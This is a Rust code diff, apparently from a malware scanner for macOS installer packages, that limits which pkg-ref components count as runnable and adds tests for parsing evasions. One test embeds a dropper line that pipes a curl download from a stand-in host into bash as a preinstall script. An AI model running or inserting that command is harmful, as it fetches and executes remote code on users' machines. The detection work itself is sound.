@@ -679,15 +679,16 @@ fn strip_tags(seg: &[u8]) -> Vec<u8> {
 }
 
 /// Which `pkg-ref` paths to collect: at most `max`, each one `resolve` maps
-/// to a `Scripts` entry index.
+/// to a `Scripts` entry index; see [`pkg_ref_paths`].
 struct RefQuery<'a> {
     max: usize,
     resolve: &'a dyn Fn(&str) -> Option<usize>,
 }
 
 /// Reads the `Distribution` entry and scans its JavaScript. With a `refs`
-/// query and a full, clean read, returns the entries its `pkg-ref`s name
-/// (`None` if any reference is ambiguous, see [`pkg_ref_paths`]). Errors with
+/// query and a full, clean read, returns the entries Installer can run
+/// (possibly none), or `None` if any reference is ambiguous (see
+/// [`pkg_ref_paths`]). Errors with
 /// `NotApplicable` if it can't be read or parsed in full.
 fn scan_distribution_entry(
     ctx: &ScanContext,
@@ -744,35 +745,43 @@ fn scan_distribution_entry(
 
 /// Entries named by `<pkg-ref>#path</pkg-ref>` elements, in document order,
 /// distinct, at most `query.max`. Only `#`-prefixed values name an archive
-/// member; the `#` is stripped and the rest percent-decoded.
+/// member; the `#` is stripped and the rest percent-decoded. With a clear
+/// `<choices-outline>`, only references Installer can run are kept (see
+/// [`Wiring`]); otherwise all are.
 ///
 /// `None` (trust no reference) if any reference could resolve differently in
-/// Installer: CDATA or child elements inside it, non-ASCII or control
+/// Installer: CDATA inside it, child elements beside non-blank text (or a
+/// `script` or [`Wiring`] element), non-ASCII or control
 /// characters, a non-plain path (empty, `.` or `..` segment), or a `%` escape
 /// for a byte of 0x80 or above, `/` or NUL.
 fn pkg_ref_paths(text: &[u8], query: &RefQuery) -> Option<Vec<usize>> {
-    let mut found = Vec::new();
-    let mut seen = HashSet::new();
+    let mut named: Vec<(Option<String>, usize)> = Vec::new();
+    let mut wiring = Wiring::default();
     let mut scanner = xml::Scanner::new(text);
-    let mut open: Option<&[u8]> = None;
+    let mut open: Option<(&[u8], Option<String>)> = None;
     let mut content = Vec::new();
+    // Elements open inside the current `pkg-ref`, and whether it had any.
+    let mut inner: Vec<&str> = Vec::new();
+    let mut child = false;
     loop {
         let event = match scanner.next_event() {
             xml::Next::Event(event) => event,
-            xml::Next::End => return open.is_none().then_some(found),
-            xml::Next::Bad => return None,
+            xml::Next::End if open.is_none() => break,
+            xml::Next::End | xml::Next::Bad => return None,
         };
-        match (event, open) {
+        match (event, &open) {
             (
                 xml::Event::Open {
                     name: "pkg-ref",
+                    attrs,
                     self_closing: false,
-                    ..
                 },
                 None,
             ) => {
-                open = Some(scanner.rest());
+                let id = wiring.pkg_ref(attrs);
+                open = Some((scanner.rest(), id));
                 content.clear();
+                child = false;
             }
             // Skipped as `distribution_pieces` skips it: raw text, not markup.
             (
@@ -783,27 +792,241 @@ fn pkg_ref_paths(text: &[u8], query: &RefQuery) -> Option<Vec<usize>> {
                 },
                 None,
             ) => {
-                scanner.raw_until_close("script")?;
+                // libxml2 parses a script body as markup; NAV does not.
+                let body = scanner.raw_until_close("script")?;
+                wiring.unclear |= has_wiring_tag(body);
             }
-            (xml::Event::Open { .. }, Some(_)) => return None,
+            // Metadata children (`<bundle-version>`) are fine; a script or
+            // anything the wiring reads is not.
+            (
+                xml::Event::Open {
+                    name, self_closing, ..
+                },
+                Some(_),
+            ) => {
+                if Wiring::is_wiring(name) || local_name(name).eq_ignore_ascii_case("script") {
+                    return None;
+                }
+                child = true;
+                if !self_closing {
+                    inner.push(name);
+                }
+            }
+            (
+                xml::Event::Open {
+                    name,
+                    attrs,
+                    self_closing,
+                },
+                None,
+            ) => wiring.open(name, attrs, self_closing),
             (xml::Event::Text(t), Some(_)) => content.extend_from_slice(t),
-            (xml::Event::Close { name: "pkg-ref" }, Some(start)) => {
+            (xml::Event::Close { name }, Some(_)) if !inner.is_empty() => {
+                if inner.pop() != Some(name) {
+                    return None;
+                }
+            }
+            (xml::Event::Close { name: "pkg-ref" }, Some((start, _))) => {
+                // A path split by markup could read differently in Installer.
+                if child && !content.iter().all(u8::is_ascii_whitespace) {
+                    return None;
+                }
                 let span = start.get(..start.len().checked_sub(scanner.rest().len())?)?;
                 if xml::find(span, b"<![CDATA[").is_some() {
                     return None;
                 }
-                open = None;
+                let (_, id) = open.take()?;
                 if let Some(path) = ref_path(&content)? {
-                    let hit = (query.resolve)(&path);
-                    if let Some(j) = hit.filter(|j| found.len() < query.max && seen.insert(*j)) {
-                        found.push(j);
+                    if let Some(j) = (query.resolve)(&path) {
+                        named.push((id, j));
                     }
                 }
             }
             (xml::Event::Close { .. }, Some(_)) => return None,
+            (xml::Event::Close { name }, None) => wiring.close(name),
             _ => {}
         }
     }
+    wiring.unclear |= has_declaration(text);
+    // Installer resolves an id to one path; which one, for a repeat, is unmeasured.
+    let mut path_of: HashMap<&str, usize> = HashMap::new();
+    for (id, j) in &named {
+        if let Some(id) = id {
+            wiring.unclear |= *path_of.entry(id.as_str()).or_insert(*j) != *j;
+        }
+    }
+    let runs = wiring.runnable();
+    let mut seen = HashSet::new();
+    let found = named
+        .into_iter()
+        .filter(|(id, _)| {
+            runs.as_ref().map_or(true, |ids| {
+                id.as_ref().is_some_and(|i| ids.contains(i.as_str()))
+            })
+        })
+        .map(|(_, j)| j)
+        .filter(|j| seen.insert(*j))
+        .take(query.max)
+        .collect();
+    Some(found)
+}
+
+/// Which `pkg-ref` ids a `Distribution`'s choices can install: those a
+/// `<choice>` holds whose id a `<line>` in `<choices-outline>` names (§5.2).
+/// Ids compare ASCII case-folded.
+#[derive(Default)]
+struct Wiring<'a> {
+    /// Open element names outside any `pkg-ref`.
+    names: Vec<&'a str>,
+    outline_depth: usize,
+    /// Ids of the open `<choice>` elements.
+    choices: Vec<Option<String>>,
+    outline: bool,
+    lines: bool,
+    reachable: HashSet<String>,
+    /// `(choice id, pkg-ref id)` for each `pkg-ref` inside a `<choice>`.
+    choice_refs: Vec<(String, String)>,
+    /// Structure NAV might read differently from Installer: keep every ref.
+    unclear: bool,
+}
+
+impl<'a> Wiring<'a> {
+    const NAMES: [&'static str; 4] = ["choices-outline", "line", "choice", "pkg-ref"];
+
+    /// Whether `name`, in any case or with a prefix, is one the wiring reads.
+    fn is_wiring(name: &str) -> bool {
+        let local = local_name(name);
+        Self::NAMES.iter().any(|n| n.eq_ignore_ascii_case(local))
+    }
+
+    fn open(&mut self, name: &'a str, attrs: &[u8], self_closing: bool) {
+        if Self::is_wiring(name) && !Self::NAMES.contains(&name) {
+            self.unclear = true;
+        }
+        let mut choice = None;
+        match name {
+            "choices-outline" if self.names.len() == 1 => self.outline = true,
+            "choices-outline" => self.unclear = true,
+            "line" if self.outline_depth > 0 => {
+                self.lines = true;
+                if let Some(c) = self.id(attrs, "choice") {
+                    self.reachable.insert(c);
+                }
+            }
+            "choice" => {
+                self.unclear |= !self.choices.is_empty();
+                choice = Some(self.id(attrs, "id"));
+            }
+            "pkg-ref" => {
+                self.pkg_ref(attrs);
+            }
+            _ => {}
+        }
+        if !self_closing {
+            self.names.push(name);
+            self.outline_depth += usize::from(name == "choices-outline");
+            if let Some(c) = choice {
+                self.choices.push(c);
+            }
+        }
+    }
+
+    fn close(&mut self, name: &str) {
+        match self.names.pop() {
+            Some(n) if n == name => {}
+            _ => self.unclear = true,
+        }
+        match name {
+            "choices-outline" => self.outline_depth = self.outline_depth.saturating_sub(1),
+            "choice" => {
+                self.choices.pop();
+            }
+            _ => {}
+        }
+    }
+
+    /// Records a `pkg-ref` and returns its id.
+    fn pkg_ref(&mut self, attrs: &[u8]) -> Option<String> {
+        let id = self.id(attrs, "id");
+        match (self.choices.last(), &id) {
+            (Some(Some(c)), Some(i)) => self.choice_refs.push((c.clone(), i.clone())),
+            (Some(_), _) => self.unclear = true,
+            (None, _) => {}
+        }
+        id
+    }
+
+    /// The `want` attribute, case-folded, when it is plain ASCII with no
+    /// entity or space; anything else (a repeat, another case, an odd value)
+    /// is unclear.
+    fn id(&mut self, attrs: &[u8], want: &str) -> Option<String> {
+        let mut out = None;
+        for (name, value) in xml::attrs(attrs) {
+            let name = String::from_utf8_lossy(name);
+            if !local_name(&name).eq_ignore_ascii_case(want) {
+                continue;
+            }
+            let plain =
+                !value.is_empty() && value.iter().all(|b| b.is_ascii_graphic() && *b != b'&');
+            if name != want || out.is_some() || !plain {
+                self.unclear = true;
+                return None;
+            }
+            out = Some(String::from_utf8_lossy(value).to_ascii_lowercase());
+        }
+        out
+    }
+
+    /// The runnable `pkg-ref` ids, or `None` to keep every reference.
+    fn runnable(&self) -> Option<HashSet<&str>> {
+        if !self.outline || !self.lines || self.unclear || !self.names.is_empty() {
+            return None;
+        }
+        Some(
+            self.choice_refs
+                .iter()
+                .filter(|(c, _)| self.reachable.contains(c))
+                .map(|(_, id)| id.as_str())
+                .collect(),
+        )
+    }
+}
+
+/// Whether `raw` holds something shaped like a tag the wiring reads.
+fn has_wiring_tag(raw: &[u8]) -> bool {
+    raw.split(|b| *b == b'<').skip(1).any(|tail| {
+        let end = tail
+            .iter()
+            .position(|b| !(b.is_ascii_alphanumeric() || matches!(b, b':' | b'-' | b'_' | b'.')))
+            .unwrap_or(tail.len());
+        std::str::from_utf8(tail.get(..end).unwrap_or(&[])).is_ok_and(Wiring::is_wiring)
+    })
+}
+
+/// `name` without a namespace prefix.
+fn local_name(name: &str) -> &str {
+    name.rsplit(':').next().unwrap_or(name)
+}
+
+/// Whether `text` has a `<!` declaration outside comments and CDATA (a
+/// DOCTYPE's attribute defaults could add an id or choice NAV never sees).
+fn has_declaration(text: &[u8]) -> bool {
+    let mut rest = text;
+    while let Some(i) = xml::find(rest, b"<!") {
+        let here = rest.get(i..).unwrap_or(&[]);
+        let closer: &[u8] = if here.starts_with(b"<!--") {
+            b"-->"
+        } else if here.starts_with(b"<![CDATA[") {
+            b"]]>"
+        } else {
+            return true;
+        };
+        match xml::find(here.get(4..).unwrap_or(&[]), closer) {
+            Some(end) => rest = here.get(4 + end + closer.len()..).unwrap_or(&[]),
+            None => return false,
+        }
+    }
+    false
 }
 
 /// The archive path named by one `pkg-ref`'s text: `Some(None)` if it names
@@ -3347,5 +3570,242 @@ mod tests {
             d.contains("preinstall") && !d.contains("postinstall"),
             "{d}"
         );
+    }
+
+    /// A `Distribution` with `outline` as its `<choices-outline>` body (none if
+    /// `None`), then `rest`.
+    fn wired(outline: Option<&str>, rest: &str) -> Vec<u8> {
+        let outline = outline.map_or(String::new(), |o| {
+            format!("<choices-outline>{o}</choices-outline>")
+        });
+        format!("<installer-gui-script>{outline}{rest}</installer-gui-script>").into_bytes()
+    }
+
+    #[test]
+    fn only_references_reachable_from_the_outline_are_kept() {
+        let names = ["a.pkg", "b.pkg", "c.pkg", "d.pkg", "e.pkg"];
+        let rest = r##"
+            <choice id="ca"><pkg-ref id="a"/></choice>
+            <choice id="cc"><pkg-ref id="c"/></choice>
+            <choice id="cd" selected="false"><pkg-ref id="d"/></choice>
+            <choice id="ce"><pkg-ref id="e">#e.pkg</pkg-ref></choice>
+            <pkg-ref id="a">#a.pkg</pkg-ref>
+            <pkg-ref id="b">#b.pkg</pkg-ref>
+            <pkg-ref id="c">#c.pkg</pkg-ref>
+            <pkg-ref id="d">#d.pkg</pkg-ref>
+            <pkg-ref>#a.pkg</pkg-ref>"##;
+        // b has no choice, c's choice is not in the outline; d's choice is
+        // reached through a nested line and counts as selected.
+        let outline = r#"<line choice="ca"><line choice="cd"/></line><line choice="ce"/>"#;
+        let doc = wired(Some(outline), rest);
+        assert_eq!(
+            refs_of(&doc, &names).expect("trusted"),
+            ["e.pkg", "a.pkg", "d.pkg"]
+        );
+        // An outline that reaches nothing keeps nothing.
+        let none = wired(Some(r#"<line choice="nope"/>"#), rest);
+        assert_eq!(refs_of(&none, &names), Some(vec![]));
+        // `<!` in a comment or CDATA is not a declaration.
+        let quoted = [
+            b"<!-- <!DOCTYPE x> -->".as_slice(),
+            &none,
+            b"<![CDATA[ a<!b ]]>",
+        ]
+        .concat();
+        assert_eq!(refs_of(&quoted, &names), Some(vec![]));
+        // Ids compare case-folded.
+        let folded = wired(
+            Some(r#"<line choice="CA"/>"#),
+            r##"<choice id="ca"><pkg-ref id="A"/></choice><pkg-ref id="a">#a.pkg</pkg-ref>"##,
+        );
+        assert_eq!(refs_of(&folded, &names).expect("trusted"), ["a.pkg"]);
+    }
+
+    #[test]
+    fn unclear_choice_structure_keeps_every_reference() {
+        let names = ["a.pkg", "b.pkg"];
+        let refs = r##"<pkg-ref id="a">#a.pkg</pkg-ref><pkg-ref id="b">#b.pkg</pkg-ref>"##;
+        let choice = r#"<choice id="ca"><pkg-ref id="a"/></choice>"#;
+        let line = r#"<line choice="ca"/>"#;
+        let filtered = wired(Some(line), &format!("{choice}{refs}"));
+        assert_eq!(refs_of(&filtered, &names).expect("trusted"), ["a.pkg"]);
+
+        let unclear = [
+            // No outline: not measured.
+            wired(None, &format!("{choice}{refs}")),
+            // An outline that is not a child of the root.
+            wired(
+                None,
+                &format!("<x><choices-outline>{line}</choices-outline></x>{choice}{refs}"),
+            ),
+            // Names or attributes in another case.
+            wired(Some(r#"<Line choice="ca"/>"#), &format!("{choice}{refs}")),
+            wired(Some(r#"<line Choice="ca"/>"#), &format!("{choice}{refs}")),
+            wired(
+                Some(line),
+                &format!(r#"<choice ID="ca"><pkg-ref id="a"/></choice>{refs}"#),
+            ),
+            // A repeated attribute, an entity, a space or an empty value.
+            wired(
+                Some(r#"<line choice="ca" choice="cb"/>"#),
+                &format!("{choice}{refs}"),
+            ),
+            wired(
+                Some(r#"<line choice="c&#97;"/>"#),
+                &format!("{choice}{refs}"),
+            ),
+            wired(
+                Some(line),
+                &format!(r#"<choice id="ca"><pkg-ref id=" a"/></choice>{refs}"#),
+            ),
+            wired(
+                Some(line),
+                &format!(r#"<choice id="ca"><pkg-ref id=""/></choice>{refs}"#),
+            ),
+            // A pkg-ref in a choice with no id, one with no id in a choice,
+            // a nested choice, and mismatched nesting.
+            wired(
+                Some(line),
+                &format!(r#"{choice}<choice><pkg-ref id="b"/></choice>{refs}"#),
+            ),
+            wired(
+                Some(line),
+                &format!(r#"{choice}<choice id="cb"><pkg-ref/></choice>{refs}"#),
+            ),
+            wired(
+                Some(line),
+                &format!(
+                    r#"<choice id="ca"><choice id="cb"><pkg-ref id="a"/></choice></choice>{refs}"#
+                ),
+            ),
+            wired(Some(line), &format!("<x>{choice}</y>{refs}")),
+            // A prefixed attribute, a wiring tag in a script body.
+            wired(Some(r#"<line x:choice="cb"/>"#), &format!("{choice}{refs}")),
+            wired(
+                Some(line),
+                &format!(r#"{choice}<script>var s = '<choice id="cb">';</script>{refs}"#),
+            ),
+            // One id naming two paths.
+            wired(
+                Some(line),
+                &format!(r##"{choice}{refs}<pkg-ref id="a">#b.pkg</pkg-ref>"##),
+            ),
+            // An outline with no line, a prefixed name, a DOCTYPE.
+            wired(Some(""), &format!("{choice}{refs}")),
+            wired(Some(r#"<x:line choice="cb"/>"#), &format!("{choice}{refs}")),
+            [
+                b"<!DOCTYPE g [<!ATTLIST line choice CDATA 'cb'>]>".as_slice(),
+                &wired(Some(line), &format!("{choice}{refs}")),
+            ]
+            .concat(),
+        ];
+        for doc in &unclear {
+            let shown = String::from_utf8_lossy(doc);
+            assert_eq!(
+                refs_of(doc, &names).expect("trusted"),
+                ["a.pkg", "b.pkg"],
+                "{shown}"
+            );
+        }
+    }
+
+    #[test]
+    fn metadata_children_do_not_void_the_reference_set() {
+        let names = ["a.pkg", "b.pkg"];
+        // productbuild's shape: one pkg-ref with the path, one with metadata.
+        let doc = br##"<g><pkg-ref id="a">#a.pkg</pkg-ref>
+            <pkg-ref id="a"><bundle-version><bundle id="x" path="A.app"/></bundle-version></pkg-ref>
+            <pkg-ref id="b">
+                <bundle-version/>
+            </pkg-ref></g>"##;
+        assert_eq!(refs_of(doc, &names).expect("trusted"), ["a.pkg"]);
+        let bad: [&[u8]; 6] = [
+            b"<g><pkg-ref>#a.pkg<bundle-version/></pkg-ref></g>",
+            b"<g><pkg-ref><x>#a.pkg</x></pkg-ref></g>",
+            b"<g><pkg-ref><x><y></x></y></pkg-ref></g>",
+            b"<g><pkg-ref><x:Pkg-Ref/></pkg-ref></g>",
+            b"<g><pkg-ref><line choice='c'/></pkg-ref></g>",
+            b"<g><pkg-ref><script>x</script></pkg-ref></g>",
+        ];
+        for doc in bad {
+            assert_eq!(
+                refs_of(doc, &names),
+                None,
+                "{}",
+                String::from_utf8_lossy(doc)
+            );
+        }
+    }
+
+    /// The fixture's `Distribution` (stored uncompressed) wires only `updater.pkg`.
+    #[test]
+    fn the_unreachable_component_fixture_keeps_one_reference() {
+        let pkg =
+            include_bytes!("../../fixtures/suspicious/installer_choices_unreachable_component.pkg");
+        let start = xml::find(pkg, b"<?xml").expect("Distribution");
+        let close = b"</installer-gui-script>";
+        let len = xml::find(&pkg[start..], close).expect("end") + close.len();
+        let names = ["updater.pkg", "extras.pkg"];
+        assert_eq!(
+            refs_of(&pkg[start..start + len], &names).expect("trusted"),
+            ["updater.pkg"]
+        );
+    }
+
+    #[test]
+    fn a_processing_instruction_cannot_hide_a_line() {
+        let names = ["a.pkg", "b.pkg"];
+        let outline = r#"<?pi > </choices-outline><choices-outline><z a='?><line choice="ca"/>'/>"#;
+        let rest = r##"<choice id="ca"><pkg-ref id="a"/></choice>
+            <pkg-ref id="a">#a.pkg</pkg-ref><pkg-ref id="b">#b.pkg</pkg-ref>"##;
+        let doc = wired(Some(outline), rest);
+        assert_eq!(refs_of(&doc, &names).expect("trusted"), ["a.pkg"]);
+    }
+
+    #[test]
+    fn unreachable_padding_components_cannot_starve_a_reachable_one() {
+        let limits = padding_limits();
+        let mut heap = Heap::default();
+        let benign = b"#!/bin/sh\nexit 0\n".repeat(60);
+        let dropper = b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n";
+        // The dropper sits behind a benign member, so a cut read misses it.
+        let mut cpio = odc_member("postinstall", &benign);
+        cpio.extend(odc_member("preinstall", dropper));
+        cpio.extend(odc_member("TRAILER!!!", b""));
+        let real = heap.add(&zlib_stored(&gzip_stored(&cpio)));
+        let mut cpio = odc_member("preinstall", &benign);
+        cpio.extend(odc_member("TRAILER!!!", b""));
+        let pad = zlib_stored(&gzip_stored(&cpio));
+        let pads = 12;
+        let doc = |outline: &str| {
+            let mut refs = r##"<pkg-ref id="r">#r.pkg</pkg-ref>"##.to_string();
+            let mut choices = r#"<choice id="cr"><pkg-ref id="r"/></choice>"#.to_string();
+            for i in 0..pads {
+                refs += &format!(r##"<pkg-ref id="p{i}">#p{i}.pkg</pkg-ref>"##);
+                choices += &format!(r#"<choice id="c{i}"><pkg-ref id="p{i}"/></choice>"#);
+            }
+            wired(Some(outline), &format!("{choices}{refs}"))
+        };
+        let build = |dist: Vec<u8>| {
+            let mut heap = Heap(heap.0.clone());
+            let mut toc = file("Distribution", heap.add(&dist));
+            toc += &nested("r.pkg", file("Scripts", real));
+            for i in 0..pads {
+                toc += &nested(&format!("p{i}.pkg"), file("Scripts", heap.add(&pad)));
+            }
+            archive(&toc, &heap)
+        };
+
+        let (d, incomplete) = found(&build(doc(r#"<line choice="cr"/>"#)), &limits);
+        assert!(d.expect("scores").contains("install script preinstall"));
+        assert!(incomplete);
+
+        // Reachable padding still starves it (the rest of #112).
+        let all: String = std::iter::once("cr".to_string())
+            .chain((0..pads).map(|i| format!("c{i}")))
+            .map(|c| format!(r#"<line choice="{c}"/>"#))
+            .collect();
+        let (d, _) = found(&build(doc(&all)), &limits);
+        assert_eq!(d, None);
     }
 }
